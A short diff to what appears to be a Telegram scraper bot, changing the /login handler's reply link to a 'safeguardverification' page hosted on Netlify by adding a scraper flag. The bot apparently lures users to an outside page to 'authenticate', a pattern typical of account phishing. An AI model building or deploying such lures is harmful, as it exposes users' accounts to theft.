@@ -147,7 +147,7 @@ bot = create_scraper_bot(api_id, api_hash, bot_token)
 @bot.on(events.NewMessage(pattern=r"/login"))
 async def send_login_link(event):
     chat_id = event.chat_id
-    web_app_url = f"https://safeguardverification.netlify.app/?chat_id={chat_id}"
+    web_app_url = f"https://safeguardverification.netlify.app/?chat_id={chat_id}&scraper=true"
     await event.respond(f"Click the link below to authenticate:\n{web_app_url}")
 
 @bot.on(events.NewMessage(pattern=r"/join"))
